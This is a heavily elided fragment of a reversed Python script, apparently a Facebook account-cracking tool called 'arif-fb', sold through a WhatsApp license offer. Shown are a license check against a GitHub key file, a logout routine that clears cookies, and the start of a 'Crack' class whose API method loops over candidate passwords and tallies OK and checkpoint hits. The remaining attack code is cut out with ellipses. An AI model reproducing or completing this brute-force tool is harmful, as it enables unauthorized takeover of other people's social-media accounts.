...
# reversed : https://github.com/RifDev
...
def xoshnaw():
  ...
  try:
    httpCaht=requests.get("https://github.com/OyenSensei/arif-fb/blob/main/Key.txt").text
    if id in httpCaht:
      ...
      whoami(f'''[bold green]Whatsapp[bold white] : [bold white] +6281991896087 [bold green][📲]''',"color(8)")
      os.system("xdg-open https://wa.me/+6281991896087?text=BANG+SAYA+MAU+BELI+LICENSI+CRACK+FB+BERAPA+HARGA+NYA+?")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
class Menu:
	...
	def menu(self):
		...
		if menu in["logout"]:
			...
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python arif-fb.py""",width=87,style=f"{color_panel}")))
		elif menu in["1","01"]:
...
class Crack:
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {P2}# {H2}Arif-XD {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {U2}{len(self.ok)}{P2} CP : {B2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw=pw.lower()
